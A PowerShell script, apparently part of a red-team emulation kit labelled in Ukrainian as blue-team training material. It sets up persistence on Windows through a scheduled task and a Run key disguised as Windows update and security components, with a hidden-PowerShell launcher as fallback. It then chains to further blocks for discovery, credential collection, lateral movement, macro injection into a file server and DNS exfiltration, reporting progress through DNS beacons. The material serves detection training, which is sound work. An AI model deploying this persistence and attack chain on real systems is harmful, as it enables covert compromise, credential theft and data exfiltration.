# =============================================================================
#  Block 1: Persistence + Orchestrator
#  для навчання — заборонено використовувати поза навчальним середовищем
#  EXERCISE ONLY — Blue Team Training
# =============================================================================
# Що робить:
#   1. Перевіряє які блоки вже виконані (по артефактах) — пропускає виконані
#   2. Копіює всі скрипти (block1, block2, block3) в %APPDATA%\Microsoft\WinUpd\
#   3. Створює Scheduled Task "WindowsUpdateCheck" → запуск при логоні
#   4. Додає Run key "SecurityHealthUpdater" в реєстр
#   5. Після завершення — запускає block2, потім block3 (з перевіркою артефактів)
#
# Артефакти для blue team:
#   - Sysmon EID 1  : schtasks.exe
#   - Sysmon EID 11 : файли в %APPDATA%\Microsoft\WinUpd\
#   - Sysmon EID 13 : запис в реєстр
#
# Після рестору снапшоту:
#   ScheduledTask запускає цей файл → він бачить block1 вже done →
#   переходить одразу до block2 → block3
# =============================================================================

param(
    [int]$DelayBetweenBlocks = 15
)

$BLOCK_TAG = "B1"
$LogPath   = "C:\ProgramData\upd_logs\block1.log"
. "$PSScriptRoot\config.ps1"

# ── Шляхи ─────────────────────────────────────────────────────────────────────

$SCRIPT_DIR = Split-Path $MyInvocation.MyCommand.Path

# ── Перевірка чи блок вже виконався ──────────────────────────────────────────

function Test-BlockDone {
    param([string[]]$Markers)
    foreach ($marker in $Markers) {
        if (-not (Test-Path $marker)) { return $false }
    }
    return $true
}

$B1_MARKERS = @("$PERSIST_DIR\block1_persist.ps1", $LogPath)
$B2_MARKERS = @("$LOG_DIR\sysinfo.txt", "$LOG_DIR\creds")
$B3_MARKERS = @("$LOG_DIR\block3.log")
$B4_MARKERS = @("$LOG_DIR\block4.log")
$B5_MARKERS = @("$LOG_DIR\block5.log")
$B6_MARKERS = @("$LOG_DIR\block6.log")
$B7_MARKERS = @("$LOG_DIR\block7.log")

# =============================================================================
# BLOCK 1 — запускається тільки якщо артефакти ще не існують
# =============================================================================

if (Test-BlockDone -Markers $B1_MARKERS) {
    Write-Log "Block 1 вже виконано — пропускаємо"
} else {

    Write-Log "=== BLOCK 1: PERSISTENCE START ==="
    Invoke-DnsBeacon -Label "B1:START:$env:COMPUTERNAME"

    # ── 0. Створюємо persistent-папку і infection marker ─────────────────────
    if (-not (Test-Path $PERSIST_DIR)) {
        New-Item -Path $PERSIST_DIR -ItemType Directory -Force | Out-Null
    }
    # wsu.lock — маркер що машина вже заражена.
    # Block6 перевіряє його на цілі перед копіюванням → не заражає двічі.
    "$env:COMPUTERNAME | $(Get-Date)" | Out-File "C:\Windows\Temp\wsu.lock" -Encoding UTF8 -Force

    # ── 1. Копіюємо ВСІ скрипти в persistent-папку ───────────────────────────

    @("config.ps1","block1_persist.ps1","block2_discovery.ps1","block3_scan.ps1","block4_staging.ps1","block5_exfil.ps1","block6_lateral.ps1","block7_fileserver.ps1") | ForEach-Object {
        $src = Join-Path $SCRIPT_DIR $_
        if (Test-Path $src) {
            Copy-Item -Path $src -Destination $PERSIST_DIR -Force
            Write-Log "Copied: $_ → $PERSIST_DIR"
        }
    }

    # ── Persistence: каскадний fallback (сильніший → слабший) ───────────────
    # Якщо один метод спрацював — зупиняємось
    $PERSIST_B1    = "$PERSIST_DIR\block1_persist.ps1"
    $persist_used  = $null

    # .bat launcher для schtasks і Startup (шлях без пробілів)
    $launcher = "$PERSIST_DIR\WinSecUpdate.bat"
    "@echo off`npowershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$PERSIST_B1`"" |
        Out-File -FilePath $launcher -Encoding ASCII -Force

    # ── Метод 1: Scheduled Task (T1053.005) — найсильніший ───────────────────
    $result = schtasks /create /TN "WindowsUpdateCheck" /TR $launcher /SC ONLOGON /F 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Log "Persistence [schtask]: WindowsUpdateCheck → $launcher"
        $persist_used = "schtask"
    } else {
        Write-Log "Persistence [schtask] failed — fallback HKCU Run key" -Level "WARN"
    }

    # ── Метод 2: HKCU Run key (T1547.001) — якщо schtask не спрацював ───────
    if (-not $persist_used) {
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name "SecurityHealthUpdater" -Value $launcher -PropertyType String -Force |
            Out-Null
        if ((Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue).SecurityHealthUpdater) {
            Write-Log "Persistence [runkey]: SecurityHealthUpdater → $launcher"
            $persist_used = "runkey"
        } else {
            Write-Log "Persistence [runkey] failed — fallback Startup folder" -Level "WARN"
        }
    }

    # ── Метод 3: Startup folder (T1547.001) — якщо нічого не спрацювало ─────
    if (-not $persist_used) {
        $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        if (-not (Test-Path $startup)) { New-Item -Path $startup -ItemType Directory -Force | Out-Null }
        Copy-Item -Path $launcher -Destination "$startup\WinSecUpdate.bat" -Force -ErrorAction SilentlyContinue
        if (Test-Path "$startup\WinSecUpdate.bat") {
            Write-Log "Persistence [startup]: WinSecUpdate.bat → $startup"
            $persist_used = "startup"
        } else {
            Write-Log "Persistence [startup] failed — всі методи вичерпано!" -Level "ERROR"
        }
    }

    Write-Log "=== BLOCK 1: COMPLETE === persist=$persist_used"
    Invoke-DnsBeacon -Label "B1:PERSIST:$persist_used"
}

# =============================================================================
# CHAIN → BLOCK 2
# =============================================================================

# Блоки 2 і 3 шукаємо там де зараз запущений цей скрипт
# (або в SCRIPT_DIR якщо це перший запуск, або в PERSIST_DIR після рестору)
$BLOCKS_DIR = $SCRIPT_DIR

if (Test-BlockDone -Markers $B2_MARKERS) {
    Write-Log "Block 2 вже виконано — пропускаємо"
} else {
    Write-Log "Chain → Block 2 (затримка $DelayBetweenBlocks сек)"
    Invoke-DnsBeacon -Label "B1:CHAIN:B2"
    Start-Sleep -Seconds $DelayBetweenBlocks

    $b2_script = Join-Path $BLOCKS_DIR "block2_discovery.ps1"
    if (Test-Path $b2_script) {
        & $b2_script
    } else {
        Write-Log "block2_discovery.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
    }
}

# =============================================================================
# CHAIN → BLOCK 3
# =============================================================================

if (Test-BlockDone -Markers $B3_MARKERS) {
    Write-Log "Block 3 вже виконано — пропускаємо"
} else {
    Write-Log "Chain → Block 3 (затримка $DelayBetweenBlocks сек)"
    Invoke-DnsBeacon -Label "B1:CHAIN:B3"
    Start-Sleep -Seconds $DelayBetweenBlocks

    $b3_script = Join-Path $BLOCKS_DIR "block3_scan.ps1"
    if (Test-Path $b3_script) {
        & $b3_script
    } else {
        Write-Log "block3_scan.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
    }
}

# ── Block 6: Lateral Movement ─────────────────────────────────────────────────

if (Test-BlockDone -Markers $B6_MARKERS) {
    Write-Log "Block 6 вже виконано — пропускаємо"
} else {
    Write-Log "Chain → Block 6 (затримка $DelayBetweenBlocks сек)"
    Invoke-DnsBeacon -Label "B1:CHAIN:B6"
    Start-Sleep -Seconds $DelayBetweenBlocks

    $b6_script = Join-Path $BLOCKS_DIR "block6_lateral.ps1"
    if (Test-Path $b6_script) {
        & $b6_script
    } else {
        Write-Log "block6_lateral.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
    }
}

# ── Block 7: File Server Macro Injection ──────────────────────────────────────

if (Test-BlockDone -Markers $B7_MARKERS) {
    Write-Log "Block 7 вже виконано — пропускаємо"
} else {
    Write-Log "Chain → Block 7 (затримка $DelayBetweenBlocks сек)"
    Invoke-DnsBeacon -Label "B1:CHAIN:B7"
    Start-Sleep -Seconds $DelayBetweenBlocks

    $b7_script = Join-Path $BLOCKS_DIR "block7_fileserver.ps1"
    if (Test-Path $b7_script) {
        & $b7_script
    } else {
        Write-Log "block7_fileserver.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
    }
}

# ── Block 4: Archive Staging ──────────────────────────────────────────────────

if (Test-BlockDone -Markers $B4_MARKERS) {
    Write-Log "Block 4 вже виконано — пропускаємо"
} else {
    Write-Log "Chain → Block 4 (затримка $DelayBetweenBlocks сек)"
    Invoke-DnsBeacon -Label "B1:CHAIN:B4"
    Start-Sleep -Seconds $DelayBetweenBlocks

    $b4_script = Join-Path $BLOCKS_DIR "block4_staging.ps1"
    if (Test-Path $b4_script) {
        & $b4_script
    } else {
        Write-Log "block4_staging.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
    }
}

# ── Block 5: DNS Exfiltration ─────────────────────────────────────────────────

if (Test-BlockDone -Markers $B5_MARKERS) {
    Write-Log "Block 5 вже виконано — пропускаємо"
} else {
    Write-Log "Chain → Block 5 (затримка $DelayBetweenBlocks сек)"
    Invoke-DnsBeacon -Label "B1:CHAIN:B5"
    Start-Sleep -Seconds $DelayBetweenBlocks

    $b5_script = Join-Path $BLOCKS_DIR "block5_exfil.ps1"
    if (Test-Path $b5_script) {
        & $b5_script
    } else {
        Write-Log "block5_exfil.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
    }
}

# =============================================================================

Write-Log "=== ALL BLOCKS DONE ==="
Write-Log "B1:$(Test-BlockDone $B1_MARKERS) B2:$(Test-BlockDone $B2_MARKERS) B3:$(Test-BlockDone $B3_MARKERS) B4:$(Test-BlockDone $B4_MARKERS) B5:$(Test-BlockDone $B5_MARKERS) B6:$(Test-BlockDone $B6_MARKERS) B7:$(Test-BlockDone $B7_MARKERS)"
Invoke-DnsBeacon -Label "B1:ALL:DONE:$env:COMPUTERNAME"
